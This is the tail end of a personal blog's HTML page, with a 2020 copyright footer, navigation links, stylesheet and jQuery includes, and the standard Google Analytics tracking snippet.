        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Homer
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<link rel="stylesheet" href="/lib/meslo-LG/styles.css">


<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>



    <!-- Google Analytics -->
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-37473492-6', 'auto');
        ga('send', 'pageview');
    </script>



